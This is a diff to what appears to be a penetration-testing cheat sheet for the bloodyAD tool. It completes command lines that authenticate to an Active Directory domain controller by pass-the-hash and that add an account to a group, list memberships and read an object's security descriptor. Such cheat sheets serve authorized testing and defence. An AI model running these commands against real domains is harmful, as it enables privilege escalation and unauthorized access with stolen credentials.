@@ -77,7 +77,7 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add
 ## add - groupMember (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> add  groupMember <group_sam> <target_sam>
 ```
 ## add - rbcd (pth)
 https://github.com/CravateRouge/bloodyAD
@@ -114,12 +114,12 @@ bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get
 ## get - membership (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get membership <target_sAMAccountName>
 ```
 ## get - object (pth)
 https://github.com/CravateRouge/bloodyAD
 ```bash
-bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get  
+bloodyad --host <dc_ip> -d <domain> -u <user> -p :<nt_hash> -v <level|INFO> get object --resolve-sd <target_sAMAccountName>
 ```
 ## get - search (pth)
 https://github.com/CravateRouge/bloodyAD
